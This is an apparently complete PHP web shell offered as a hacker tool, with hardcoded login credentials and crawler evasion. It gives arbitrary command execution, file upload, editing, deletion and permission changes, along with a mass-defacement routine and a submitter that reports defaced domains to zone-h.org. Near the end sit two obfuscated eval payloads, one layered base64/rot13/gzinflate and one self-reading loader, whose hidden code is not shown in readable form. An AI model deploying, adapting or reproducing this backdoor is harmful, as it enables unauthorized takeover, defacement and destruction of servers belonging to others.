  <?php

//** Shell Mini Backdorr V 2.0
//** Author r00t@star feat Mr.S03
//** Other shell backdorr Please Call me or mr s03 
/** PHP Coded **/
/** Thx To : Sunda Cyber Army **/
/** Special Thx : Indoxploit, TatSumy Crew, Mr. D, Google search engine **/
//** Jika Terjadi error silahkan chat saya awoakawoak **//

session_start();
error_reporting(0);
set_time_limit(9999999);
$login='TanahAir';
$password='Indonesia';
$hidden_login =TRUE; // Hidden login, TRUE or FALSE
$hidden_login_uri = "?login=1945"; // login url , default : shell.php?login=1945
$auth=1;
$version='';
$msgnotice='-::Mini Shell Star & Mr$03::-';
if($_GET['gans']=="burik") {
$style='<title>Gegeh</title><STYLE>
BODY{
  background-color: #000000;
  color: #C1C1C7;
  font: 12pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  MARGIN-TOP: 0px;
  MARGIN-BOTTOM: 0px;
  MARGIN-LEFT: 0px;
  MARGIN-RIGHT: 0px;
  margin:0;
  padding:0;
  scrollbar-face-color: #000000;
  scrollbar-shadow-color: #000000;
  scrollbar-highlight-color: #484848;
  scrollbar-3dlight-color: #333333;
  scrollbar-darkshadow-color: #333333;
  scrollbar-track-color: #333333;
  scrollbar-arrow-color: #333333;
}
input{
  background-color: #000000;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
select{
  background-color: #FF8D00;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
textarea{
  background-color: #000000;
  font-size: 10pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
a:link{
  
  color: #2FFF00;
  text-decoration: none;
  font-size: 8pt;
}
a:visited{
  color: #0000FF;
  text-decoration: none;
  font-size: 8pt;
}
a:hover, a:active{
  width: 100%;
  background-color: #A8A8AD;
  

  color: #E7E7EB;
  text-decoration: none;
  font-size: 8pt;
}
td, th, p, li{
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  border-color:black;
}
</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").'~Ini Bukan Shell~</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
//auth
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
if(@$_SESSION['an']==0){
echo '<center><center><body bgcolor="white">
<header>
<link href="https://fonts.googleapis.com/css?family=Ranga|Mandali" rel="stylesheet" type="text/css">
            <center> 
<style type="text/css">
            header {
	margin: 10px auto;
            }
            input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: white;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
            }
            input[type=username] {
           width: 250px;
           height: 25px;
           color: red;
           background: white;
            border: 1px dotted green;
            margin-left: 20px;
            text-align: center;
}
</style>
</head>
<body>
<h1><center></div><center><font color=pink face=Ranga>
#######################################
 <br>      *-* Author : r00t@star  ft mr.$03                                <br>
       *-* Team   : Sunda Cyber Army                     <br>
#######################################
<br></h1><font face=Mandali>
	</pre> <br><audio autoplay="autoplay" controls="controls" src="https://j.top4top.net/m_1238rj88m0.mp3" type="audio/mpeg"></audio>
</header>
</center><br><font color="orange"><table><form method="POST"><tr><td>Username ~></font></td><td><input type="username" name="login" value=""></td></tr><font color="orange"><tr><td>Password ~></td><td></font><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Login"><br><b><center></b><h2>Coded by<br><font color="cyan">..::: Star & Mr$03:::.</font></h3></center></td></tr></form></table></br></center>';
echo $footer;
exit;}
}else{
header('HTTP/1.1 404 Not Found');
die();
}
//end auth


/*------------------ Login Data End ----------*/

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Aeiwi", "Alexa", "Alltheweb", "altavista", "AOL netfind", "anzwers", "Canada", "directhit", "euroseek", "excite", "overture", "go", "google", "hotbot", "infomax", "kanoodle", "lycos", "mastersite", "national directory", "northern light", "searchit", "simplesearch", "websmostlinked", "webtop", "what-u-seek", "AOL", "Yahoo", "Yandex", "Webcrawler", "infoseek", "excite", "magellan", "looksmart", "CNET", "duckduckgo");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        if($_POST["usrname"]==$username && $_POST["passwrd"]==$password)
        {
            print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
            star6();
        }
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("Sorry... Wrong UserName/PassWord");</script>';
            }
        function login_shell() {
            echo '<title>star shell</title><center>
            <div id=loginbox><p><font face="verdana,arial" size=-1>
            <font color=orange>>>>>>>>>>></font><font color=white>>>>>><<<<<</font><font color=green>>>>>>>>>>></font>
            <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>Star SHELL v.2.0</b></font></th></tr>
            <tr><td bgcolor="black" style="padding:5">
            <form method="post">
            <input type="hidden" name="action" value="login">
            <input type="hidden" name="hide" value="">
            <center><table>
            <tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" value="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
            <tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="passwrd" value="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
            <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Enter"></font></td></tr></table>
            </div><br /></center>';
            exit;
        }
    }
}

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="keywords" content="Mpsh Ah Shell">
<meta property="og:image"content="https://i.ibb.co/sb68cKt/FB-IMG-15583721008373073.jpg">
<link rel="icon" type="image/jpg" href="https://i.ibb.co/nQ8swwR/IMG-20190505-WA0063.jpg"> 
<meta content="Aeiwi, Alexa, Alltheweb, altavista, AOL netfind, anzwers, Canada, directhit, euroseek, excite, overture, go, google, hotbot, infomax, kanoodle, lycos, mastersite, national directory, northern light, searchit, simplesearch, websmostlinked, webtop, what-u-seek, AOL, Yahoo, Yandex, Webcrawler, infoseek, excite, magellan, looksmart, CNET, duckduckgo" name="search engines"/>
<meta http-equiv="cache-control" content="index,cache"> 
<link href="" rel="stylesheet" type="text/css">
<title>::. Ganteng.::</title>
<style>
body{
font-family: "Racing Sans One", abel;
background-color: black;
color:white;
}
star{
font-family: "Cute+Font", courier+new;
text-shadow: 3px 1px white;
color: #F900FF;
}
#content tr:hover{
background-color: #F900FF ;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #FF00FF dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
<style>
body{
font-family: Iceland;
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.blink_text {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 2s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: #F400FF;
}
@-moz-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@-webkit-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
</style> 
</head>
<body>
<h1><center><p class="blink_text" style="font-size:70px;
color:white;
text-shadow: 0px 0px 20px #EF00FF , 0px 0px 20px #FF00A6;
font-family:Iceland;
">_-=[ Star & Mr$03 Shell ]=-_</font></font></p></center></h1></star><center><a href="https://web.facebook.com/BintangAlifff"><font color="orange">Facebook : Star</a></font><br>
	</star><a href="https://www.youtube.com/channel/UC7C1WYvJb8_UvBlK-k66lHg"><font color="orange">Youtube : Mr$03</a></font><br>
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat|Abel|Courier+New|Cute+Font" rel="stylesheet" type="text/css">';
function tgl_indo($tanggal){
	$bulan = array (
		1 =>   'Januari',
		'Februari',
		'Maret',
		'April',
		'Mei',
		'Juni',
		'Juli',
		'Agustus',
		'September',
		'Oktober',
		'November',
		'Desember'
	);
	$pecahkan = explode('-', $tanggal);
	
	// variabel pecahkan 0 = tanggal
	// variabel pecahkan 1 = bulan
	// variabel pecahkan 2 = tahun
 
	return $pecahkan[2] . ' ' . $bulan[ (int)$pecahkan[1] ] . ' ' . $pecahkan[0];
}
function getClientIP() {
 
    if (isset($_SERVER)) {
 
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
            return $_SERVER["HTTP_CLIENT_IP"];
 
        return $_SERVER["REMOTE_ADDR"];
    }
 
    if (getenv('HTTP_X_FORWARDED_FOR'))
        return getenv('HTTP_X_FORWARDED_FOR');
 
    if (getenv('HTTP_CLIENT_IP'))
        return getenv('HTTP_CLIENT_IP');
 
    return getenv('REMOTE_ADDR');
}
$_c7e = 'WGFpIFN5bmRpY2F0ZQ==';
$sys = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
$getds = @ini_get("disable_functions");
$ds = showdisablefunctions().' <font color=white>ON</font> <font color=teal>'.php_sapi_name().'</font>';
echo "<font size='5'></font>";
echo '
</center><tr><td>System: <font color=lime>'.$sys.'</font></td></tr><br>
<tr><td>Server IP: <font color=lime>'.$ip.'</font> <br>
<tr><td>Safe Mode: '.$sm.'</td></tr><br>';
echo '<td><tr>Date: <font color="lime">'.tgl_indo(date('Y-m-d'));
echo '<br></font>Your Ip: <font color="lime">'.getClientIP()."";
echo '<br></font><tr><td>Shell Version: 0.2</td></tr><br>
<td>Disable Functions: '.$ds.'</td></tr><br>
</center>
</td></tr>
</table>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><font size="3"><center><br><br>[<a href="?gans=burik"><font color="red"> HOME </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&mass=deface"><font color="red"> Mass Deface </font></a>]&nbsp;&nbsp;[ <a href="?gans=burik&tol=kon"><font color="red">Symlink</font></a> ]&nbsp;&nbsp;[<a href="?gans=burik&zon=ha"><font color="red"> Zone H </font></a>]<br>&nbsp;&nbsp;[<a href="?gans=burik&cabs=ass"><font color="red"> Kill Me</font></a> ]
<br>
<tr><td><font color="orange">Path :</font> ';
if($_GET['cabs']=="ass"){
    unset($_SESSION['an']);
    echo '<center><font color="gold" size="20"> You Was Kill Me !!</font>';
    
    header('HTTP/1.1 404 not found');
    exit;
}

function massdeface(){ 
  echo '<form method="POST"><center><br><font color="white">Destination : <br><input type="text" name="dest" style="width:486px;margin-bottom:10px;" value="'.getcwd().'">
  <textarea cols="60" rows="10" name="content">Patch by Dua Ganteng</textarea><br><input type="text" name="name_file" style="width;8px;margin-left:4px;" value="15.php">
  <input type="submit" name="goat" value="click me!" style="width:90px;">';
  if($_POST['goat']){
    return ewe_mass($_POST['dest'],$_POST['content'],$_POST['name_file']);}
  
} 

function ewe_mass($dir,$content,$name_file){ 
  if(is_dir($dir)){
    foreach (scandir($dir) as $new_dir){ 
      $dir_kontol = $dir.'/'.$new_dir;
      $path_default = $dir_kontol.'/'.$name_file;
      if(is_dir($dir_kontol)){
        if(file_put_contents($path_default,$content)){
          echo '</br><font color="green" size="2">Done > '.$path_default.'</font>';}else{echo '</br><font color="red">Fail >'.$dir_kontol;}
          
          }}
          
          }else{echo '<br><font color="red">Not Directory';}
} 
if($_GET['mass']=="deface"){ 
  return massdeface();}
function fuckk(){
echo '<style type="text/css">
a {
    color: lime;
    text-decoration: none;
}
textarea, input {
    border: 1px solid #008000;
    color: #bb0000;
    background: transparent;
}
</style>
<form method="post">
Defacer: <br>
		    	       <input type="text" name="nick" size="50" value="Dua Ganteng"><br><br>
		    	       Domains: <br>
		    	       <textarea style="width: 450px; height: 150px;" name="url" placeholder="http://google.com"></textarea><br>
		    	       <input style="background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;" type="submit" name="go" value="Submit">
		    	       </form></center>';
$nick 	= $_POST['nick'];

$url = explode('\r\n', $_POST['url']);
$go = $_POST['go'];
function sendsite($target) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POSTFIELDS, array(
            "defacer" => $nick, #Change your nick here
            "domain1" => $target,
            "hackmode" => "1",
            "reason" => "1",
            ));
    $res = curl_exec($ch);
          curl_close($ch);
    return preg_match("/<font color=\"red\">OK<\/font><\/li>/", $res);
}
if($go) {
    foreach($url as $sites) {
        if(sendsite($sites)) {
            echo "$sites => OK<br>";
        } else {
            echo "$sites => error<br>";
        }
    }
}
} 
if($_GET['zon']=="ha"){
 return fuckk();}
 
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?gans=burik&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?gans=burik&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload Berhasil</font><br />';
}else{
echo '<font color="red">Upload Gagal</font><br/>';
}
}
echo "<form method='post'>
<font color='green'>Command :</font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
</form>
</td></tr>";
if($_POST['execmd']){
echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:purple; background-color:pink;'>".exe($_POST['cmd'])."</textarea></center>";
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms
($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST
['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus
                                                   </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1"
align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?gans=burik&path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?gans=burik&option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo '<tr>
<td><a href="?gans=burik&filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?gans=burik&option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<br><br><center><br/>[-] &copy; r00t@star & Mr$03 [-]<center>
</center>
</body>
</html>";

$command = "JcxOCoAgEADAe9AfFgm85T3Tv+iybQmxLRf09VI9YHPp8b4TONC7XEcGUMpUdKdBVtjLsYUY2CpVR513OeNzDDHGIIPXbZmXr9hD+d383ng7QlUSMizfeh8=";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($command))))));

function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
?>
<?php /*** Please Dont Delete This***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=36cf7bd816162e51ea3242c82325a9880616de03VY9LC8IwEITvgv8hBMEWxIP1URVBofFxEDWNXkRKqrGtNa2YVg/ifzcbvXjKkm92duZcZsciyTOkCn7vWjZ6VSu15IZGKBKFyB4WpmS5YiSYeB7F9lBTVYaXvqsVeJIqodCMZ2gZlyIWMQYuJE+ugFN+4tcw4U+etp1xBN/NYy6N6HzPJWim+h2AhT4WGcLbHQ1qgU/ojtB9nZLNlvgs2NJF/QCCsPcvmDO2DuYrn32xbLUA6w5NhI2jVJHr9hw4Z9yNA+iAQirrm7mBft308NvREySF3u8P
